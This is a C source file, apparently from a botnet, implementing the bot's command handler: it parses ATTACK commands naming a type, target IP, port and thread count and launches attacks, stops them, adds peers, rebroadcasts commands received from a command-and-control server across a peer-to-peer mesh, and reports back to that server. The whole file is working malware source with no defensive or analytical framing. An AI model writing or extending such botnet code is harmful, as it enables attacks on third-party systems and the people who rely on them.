#include "../../include/botnet.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <errno.h>

void controller_handle_command(char *command, int from_p2p) {
    // Keep a copy of the original command for broadcasting
    char original_command[2048];
    strncpy(original_command, command, sizeof(original_command) - 1);

    printf("[*] Received command: %s %s\n", command, from_p2p ? "(from P2P)" : "(from C2)");

    char *saveptr;
    char *cmd = strtok_r(command, " \n", &saveptr);

    if (!cmd) return;

    // Broadcast command to peers if it came from the C2
    if (!from_p2p) {
        p2p_broadcast_command(original_command);
    }

    if (strcmp(cmd, "ATTACK") == 0) {
        struct attack atk;
        char *type_str = strtok_r(NULL, " \n", &saveptr);
        char *ip_str = strtok_r(NULL, " \n", &saveptr);
        char *port_str = strtok_r(NULL, " \n", &saveptr);
        char *threads_str = strtok_r(NULL, " \n", &saveptr);

        if (!type_str || !ip_str || !port_str || !threads_str) {
            printf("[-] Invalid ATTACK command format. Usage: ATTACK <type> <ip> <port> <threads>\n");
            return;
        }

        atk.type = (uint8_t)atoi(type_str);
        atk.target.addr = inet_addr(ip_str);
        atk.target.port = htons(atoi(port_str));
        atk.threads = atoi(threads_str);

        if (atk.threads <= 0 || atk.threads > 512) {
            printf("[-] Invalid thread count: %d. Must be between 1 and 512.\n", atk.threads);
            return;
        }

        attack_start(&atk);

    } else if (strcmp(cmd, "STOP") == 0) {
        attack_stop_all();
    } else if (strcmp(cmd, "ADD_PEER") == 0) {
        char *peer_ip = strtok_r(NULL, " \n", &saveptr);
        if (peer_ip) {
            p2p_add_peer(peer_ip);
        }
    } else {
        printf("[-] Unknown command: %s\n", cmd);
    }
}

void controller_send_response(char *response) {
    printf("[*] Sending response: %s\n", response);
    c2_send(response, strlen(response));
}
